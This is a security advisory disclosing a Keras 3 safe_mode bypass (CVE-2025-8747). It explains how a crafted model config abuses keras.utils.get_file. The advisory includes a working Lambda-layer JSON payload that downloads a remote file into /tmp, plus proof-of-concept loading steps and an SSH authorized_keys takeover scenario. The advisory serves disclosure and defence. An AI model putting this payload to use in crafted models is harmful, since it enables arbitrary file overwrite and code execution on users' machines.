# Keras vulnerable to CVE-2025-1550 bypass via reuse of internal functionality

**GHSA**: GHSA-c9rc-mg46-23w3 | **CVE**: CVE-2025-8747 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-502

**Affected Packages**:
- **keras** (pip): >= 3.0.0, < 3.11.0

## Description

### Summary
It is possible to bypass the mitigation introduced in response to [CVE-2025-1550](https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp), when an untrusted Keras v3 model is loaded, even when “safe_mode” is enabled, by crafting malicious arguments to built-in Keras modules.

The vulnerability is exploitable on the default configuration and does not depend on user input (just requires an untrusted model to be loaded).

### Impact

| Type   | Vector   |Impact|
| -------- | ------- | ------- |
|Unsafe deserialization |Client-Side (when loading untrusted model)|Arbitrary file overwrite. Can lead to Arbitrary code execution in many cases.|


### Details

Keras’ [safe_mode](https://www.tensorflow.org/api_docs/python/tf/keras/models/load_model) flag is designed to disallow unsafe lambda deserialization - specifically by rejecting any arbitrary embedded Python code, marked by the “__lambda__” class name.
https://github.com/keras-team/keras/blob/v3.8.0/keras/src/saving/serialization_lib.py#L641 -

```
if config["class_name"] == "__lambda__":
        if safe_mode:
            raise ValueError(
                "Requested the deserialization of a `lambda` object. "
                "This carries a potential risk of arbitrary code execution "
                "and thus it is disallowed by default. If you trust the "
                "source of the saved model, you can pass `safe_mode=False` to "
                "the loading function in order to allow `lambda` loading, "
                "or call `keras.config.enable_unsafe_deserialization()`."
            )
```

A fix to the vulnerability, allowing deserialization of the object only from internal Keras modules, was introduced in the commit [bb340d6780fdd6e115f2f4f78d8dbe374971c930](https://github.com/keras-team/keras/commit/bb340d6780fdd6e115f2f4f78d8dbe374971c930). 

```
package = module.split(".", maxsplit=1)[0]
if package in {"keras", "keras_hub", "keras_cv", "keras_nlp"}:
```

However, it is still possible to exploit model loading, for example by reusing the internal Keras function `keras.utils.get_file`, and download remote files to an attacker-controlled location.
This allows for arbitrary file overwrite which in many cases could also lead to remote code execution. For example, an attacker would be able to download a malicious `authorized_keys` file into the user’s SSH folder, giving the attacker full SSH access to the victim’s machine.
Since the model does not contain arbitrary Python code, this scenario will not be blocked by “safe_mode”. It will bypass the latest fix since it uses a function from one of the approved modules (`keras`).

#### Example 
The following truncated `config.json` will cause a remote file download from https://raw.githubusercontent.com/andr3colonel/when_you_watch_computer/refs/heads/master/index.js to the local `/tmp` folder, by sending arbitrary arguments to Keras’ builtin function `keras.utils.get_file()` -

```
           {
                "class_name": "Lambda",
                "config": {
                    "arguments": {
                        "origin": "https://raw.githubusercontent.com/andr3colonel/when_you_watch_computer/refs/heads/master/index.js",
                        "cache_dir":"/tmp",
                        "cache_subdir":"",
                        "force_download": true},
                    "function": {
                        "class_name": "function",
                        "config": "get_file",
                        "module": "keras.utils"
                    }
                },
 ```


### PoC

1. Download [malicious_model_download.keras](https://drive.google.com/file/d/1gS2I6VTTRUwUq8gBoMmvTGaN0SX1Vr8F/view?usp=drive_link) to a local directory

2. Load the model -

```
from keras.models import load_model
model = load_model("malicious_model_download.keras", safe_mode=True)
```

3. Observe that a new file `index.js` was created in the `/tmp` directory 

### Fix suggestions
1. Add an additional flag `block_all_lambda` that allows users to completely disallow loading models with a Lambda layer.
1. Audit the `keras`, `keras_hub`, `keras_cv`, `keras_nlp` modules and remove/block all “gadget functions” which could be used by malicious ML models.
1. Add an additional flag `lambda_whitelist_functions` that allows users to specify a list of functions that are allowed to be invoked by a Lambda layer

### Credit 
The vulnerability was discovered by Andrey Polkovnichenko of the JFrog Vulnerability Research
